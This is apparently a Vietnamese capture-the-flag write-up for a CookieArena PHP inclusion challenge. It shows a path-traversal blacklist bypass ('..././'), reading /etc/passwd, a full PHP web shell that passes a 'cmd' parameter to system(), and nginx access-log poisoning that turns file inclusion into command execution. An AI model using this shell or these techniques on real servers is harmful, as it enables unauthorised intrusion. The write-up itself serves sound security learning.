# LOCAL FILE INCLUSION TO RMOTE FILE INCLUSION 

[link chanllenge](https://battle.cookiearena.org/challenges/web/php-inclusion-to-rce)

### Giao điện
>  đây là giao diện của challnge
![Alt text](image.png)
cái này nó chỉ có 1 chức năng thôi ! 
là button *What is CTF ? 
nó đọc file dựa vào trên URl
![Alt text](image-1.png)
*Dùng dirsearch xem nó có thư mục khác không ? 
![Alt text](image-2.png)
không có gì để thử 
đọc file qua param thử chọc path traversal xem có dính ko ? 
thử ``` ../../``` xem 
![Alt text](image-3.png)
có vẻ nó đã không hoạt động , mình lùi 2 cấp mà vẫn đọc được file ctf.txt 
thử dùng encoding xem 
``` %2e%2e%2f```
![Alt text](image-4.png)
vẫn ko được :> có vẻ nó đang dùng blacklist và không encoding 
thường nó sẽ dùng blacklíst  ```../``` replace cái này trong input 
thử thành  ```..././``` và nó sẽ thành ```../```sau khi xóa blacklist
![Alt text](image-5.png)
và nó đã ko đọc được file ctf.txt 
chứng tỏ mình đã thành công ! 
hint : là tìm trong root đi 
![Alt text](image-6.png)
ok nãy thấy dùng dirsearch thấy có 1 file /file thôi , lùi 2 cấp là ra được root  thử đọc ```etc/passwd``` xem được không ? 
![Alt text](image-7.png)
ok rùi => đọc file flag.txt thôi 
![Alt text](image-8.png)
méo đọc được anh em ạ :> , chắc là nó có tên khác ? 
> tên khác thì mình biết thế nào được mà xem :>>>
xem được tên khác mà vul là file path thì RCE thử xem => lên mạng nhặt 1 file shell php vứt vào index xem được ko ? 
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
code link vứt vào input xem sao ! 
![Alt text](image-9.png)
vẫn không chạy anh em ạ :> 
trường hợp không chạy  ? 
- ![Alt text](image-10.png)
là tham số ```ALLOW_URL```bằNG OFF
2 là hàm đọc này nó ko cho remote url 
có thể là ```fopen```
và biết server nó là ngnix 
và đọc được file log của nó ! 
``` /var/log/nginx/access.log```
![Alt text](image-11.png)
:> đây là thử gửi 1 request lên mà trong các trường http header của mình chứa code php mà hàm đọc này có chức năng execute thì -> sử dụng shell xem được tên của flag mới 
![Alt text](image-12.png)
và giờ kiểm tra log thôi , nhớ thêm ```&cmd=ls /``` để chạy os commnad 
đây là request vừa gửi lên 
![Alt text](image-13.png)
giờ request đó đã chứa code php chỉ chờ $_GET  có value trên URL 
![Alt text](image-14.png)
giờ đã có tên mới flag ->  mở thôi ! 
![Alt text](image-15.png)
